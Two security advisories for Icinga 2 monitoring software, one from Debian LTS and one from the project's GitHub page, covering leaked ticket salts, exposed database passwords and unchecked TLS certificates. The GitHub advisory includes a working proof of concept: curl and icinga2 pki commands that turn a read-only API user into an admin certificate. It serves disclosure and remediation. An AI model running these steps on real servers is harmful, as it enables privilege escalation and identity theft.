=== Content from lists.debian.org_8c80decf_20250115_094755.html ===


---

[[Date Prev](msg00009.html)][[Date Next](msg00011.html)]
[[Thread Prev](msg00009.html)][[Thread Next](msg00011.html)]
[[Date Index](maillist.html#00010)]
[[Thread Index](threads.html#00010)]

# [SECURITY] [DLA 2816-1] icinga2 security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 2816-1] icinga2 security update
* *From*: Sylvain Beucler <beuc@beuc.net>
* *Date*: Wed, 10 Nov 2021 22:42:17 +0100
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/20211110214217.GA10805%40mail.beuc.net)Â [20211110214217.GA10805@mail.beuc.net](msg00010.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-2816-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                      Sylvain Beucler
November 10, 2021                             <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : icinga2
Version        : 2.6.0-2+deb9u2
CVE ID         : CVE-2021-32739 CVE-2021-32743 CVE-2021-37698
Debian Bug     : 991494

Several vulnerabilities were discovered in Icinga 2, a general-purpose
monitoring application. An attacker could retrieve sensitive
information such as service passwords and ticket salt by querying the
web API, or by intercepting unsufficiently checked encrypted
connections.

CVE-2021-32739

    A vulnerability exists that may allow privilege escalation for
    authenticated API users. With a read-ony user's credentials, an
    attacker can view most attributes of all config objects including
    `ticket_salt` of `ApiListener`. This salt is enough to compute a
    ticket for every possible common name (CN). A ticket, the master
    node's certificate, and a self-signed certificate are enough to
    successfully request the desired certificate from Icinga. That
    certificate may in turn be used to steal an endpoint or API user's
    identity.  See also complementary manual procedures:
    <https://icinga.com/blog/2021/07/15/releasing-icinga-2-12-5-and-2-11-10/#change-ticket-salt>
    <https://icinga.com/blog/2021/07/15/releasing-icinga-2-12-5-and-2-11-10/#replace-icinga-ca>

CVE-2021-32743

    Some of the Icinga 2 features that require credentials for
    external services expose those credentials through the API to
    authenticated API users with read permissions for the
    corresponding object types. IdoMysqlConnection and
    IdoPgsqlConnection exposes the password of the user used to
    connect to the database. An attacker who obtains these credentials
    can impersonate Icinga to these services and add, modify and
    delete information there. If credentials with more permissions are
    in use, this increases the impact accordingly.

CVE-2021-37698

    InfluxdbWriter and Influxdb2Writer do not verify the server's
    certificate despite a certificate authority being
    specified. Icinga 2 instances which connect to any of the
    mentioned time series databases (TSDBs) using TLS over a spoofable
    infrastructure should immediately upgrade. Such instances should
    also change the credentials (if any) used by the TSDB writer
    feature to authenticate against the TSDB.

For Debian 9 stretch, these problems have been fixed in version
2.6.0-2+deb9u2.

We recommend that you upgrade your icinga2 packages.

For the detailed security status of icinga2 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/icinga2>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEE1vEOfV7HXWKqBieIDTl9HeUlXjAFAmGML3YACgkQDTl9HeUl
XjD+ZA/+PYLea+G/in5SPqF7BLHUHSTnbfpCaXJorQ1yP5OX74SlnP8uSnHF0kXK
NbQ+dVF4uJ+n1Yy7c47hd+VnVE4nP7qXxJF41eHC04/Qg2W3i17ZE0vQ0zSUF/GI
RmwyVB0VmyTMd9MRZb6ZIVyKxaT11y14YQrXwQEnRI9yhj54mtFSa7DX4UA0FZKj
CjR5NpyOUDJsCgz1rorapo2y+1NYdM4LyOy9BvkhJ/Pc0Oy635jhKmkCs/JbhN3W
chCsWwvnTDoxtddpSGbXXMR79TKlSTTbMBo9eEngtNsuDvNMhZjyLYKz5N8sgjwz
kMF0Ei5Uvfy+JjurObokx6piUWwpa5DPQqMLlCS6Is5GRsZzCudtFzrayfavlFAX
6hUfIJWKxcXVT+7QBI3/Hx8n/A/OSMJxNzGJYka9ZJhwmDvPDB+fHl/1UGFlraSR
DbIe9NyM8pQ/P5++NCJyZX46DZ8nTp5NOuEWXNs0lA36BkLAJ6YOT1P63IDt89Cr
GbjWjQCxBrpN3CFvYo8n2MAa42pKHaJYkJ79jQLt+v3BUXiQkyfV1A9/2ZkNL5WP
AR2K90lV/mvAXgs5fWL2yJ5yuKmnjKRVn5n8rNldmUpwwZ++7TNH9T2qjzSCcZdL
vKMSaEbgiE99sFJPBe0JgvIZwHiEFYFz753YGjhwwaGztbsHhVI=
=KsgK
-----END PGP SIGNATURE-----

```

---



=== Content from github.com_6bf95f1d_20250115_094754.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FIcinga%2Ficinga2%2Fsecurity%2Fadvisories%2FGHSA-98wp-jc6q-x5q5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FIcinga%2Ficinga2%2Fsecurity%2Fadvisories%2FGHSA-98wp-jc6q-x5q5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=Icinga%2Ficinga2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Icinga](/Icinga)
/
**[icinga2](/Icinga/icinga2)**
Public

* [Notifications](/login?return_to=%2FIcinga%2Ficinga2) You must be signed in to change notification settings
* [Fork
  579](/login?return_to=%2FIcinga%2Ficinga2)
* [Star
   2k](/login?return_to=%2FIcinga%2Ficinga2)

* [Code](/Icinga/icinga2)
* [Issues
  321](/Icinga/icinga2/issues)
* [Pull requests
  155](/Icinga/icinga2/pulls)
* [Actions](/Icinga/icinga2/actions)
* [Projects
  1](/Icinga/icinga2/projects)
* [Security](/Icinga/icinga2/security)
* [Insights](/Icinga/icinga2/pulse)

Additional navigation options

* [Code](/Icinga/icinga2)
* [Issues](/Icinga/icinga2/issues)
* [Pull requests](/Icinga/icinga2/pulls)
* [Actions](/Icinga/icinga2/actions)
* [Projects](/Icinga/icinga2/projects)
* [Security](/Icinga/icinga2/security)
* [Insights](/Icinga/icinga2/pulse)

# Results of queries for ApiListener objects include the ticket salt which allows in turn to steal (more privileged) identities

High

[julianbrost](/julianbrost)
published
GHSA-98wp-jc6q-x5q5
Jul 15, 2021

## Package

No package listed

## Affected versions

v2.4.0 through v2.12.4

## Patched versions

v2.12.5 and v2.11.10

## Description

### Impact

Alice operates a regular master instance with a read-ony API user. Let's say for a dashboard.

```
object ApiUser "r/o" {
  password = "123456"
  permissions = [ "objects/query/*" ]
}

```

For better demonstration there's also an administrator with all possible permissions. To be as secure as possible, that user is authenticated by an X.509 certificate, not by a password.

```
object ApiUser "admin" {
  client_cn = "admin"
  permissions = [ "*" ]
}

```

With the read-ony user's credentials Eve can view most attributes of all config objects including `ticket_salt` of `ApiListener`.

```
root@eve:~$ curl -fksSLu r/o:123456 'https://10.211.55.58:5665/v1/objects/apilisteners?attrs=ticket_salt'
{"results":[{"attrs":{"ticket_salt":"7aa3ae9f1df6d6137fdc71831bfcd94a"},"joins":{},"meta":{},"name":"api","type":"ApiListener"}]}

```

This salt is enough to compute a ticket for every possible CN.

```
root@eve:~# icinga2 pki ticket --cn admin --salt 7aa3ae9f1df6d6137fdc71831bfcd94a
f8dabbb9acd2a92a16b65ee6cadd698b07e0f7b8

```

A such ticket, the master node's certificate, and a self-signed certificate are in turn enough to successfully [request the desired certificate](https://icinga.com/docs/icinga-2/latest/doc/06-distributed-monitoring/#csr-auto-signing) from Icinga.

```
root@eve:~# icinga2 pki save-cert --trustedcert /tmp/alice.crt --host 10.211.55.58 --port 5665 -x warning
(...)
root@eve:~# icinga2 pki new-cert --cn admin --key /tmp/admin.key --csr /tmp/admin.csr --cert /tmp/admin.crt -x warning
root@eve:~# icinga2 pki request --key /tmp/admin.key --cert /tmp/admin.crt --ca /tmp/ca.crt --trustedcert /tmp/alice.crt --host 10.211.55.58 --port 5665 --ticket f8dabbb9acd2a92a16b65ee6cadd698b07e0f7b8 -x warning

```

And that certificate may in turn be used to steal an endpoint or API user's identity.

```
root@eve:~# curl -fksSL --cert /tmp/admin.crt --key /tmp/admin.key 'https://10.211.55.58:5665/v1?pretty=1'
{
    "results": [
        {
            "info": "More information about API requests is available in the documentation at https://icinga.com/docs/icinga2/latest/",
            "permissions": [
                "*"
            ],
            "user": "admin",
            "version": "r2.12.4-1"
        }
    ]
}

```
### Patches

Users should immediately upgrade to v2.12.5 or (if not possible) to v2.11.10. Both of them fix the vulnerability.

### Workarounds

Either specify queryable types explicitly.

```
object ApiUser "r/o" {
  password = "123456"
  permissions = [ "objects/query/Host", "objects/query/Service" ]
}

```

Or filter out ApiListener objects.

```
object ApiUser "r/o" {
  password = "123456"
  permissions = [ {
    permission = "objects/query/*"
    filter = {{ obj.type != "ApiListener" }}
  } ]
}

```
### References

* <https://icinga.com/blog/2021/07/15/releasing-icinga-2-12-5-and-2-11-10/>

### For more information

If you have any questions or comments about this advisory:

* Email us at security(at)icinga.com

### Severity

High

### CVE ID

CVE-2021-32739

### Weaknesses

[CWE-267](/advisories?query=cwe%3A267)

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.


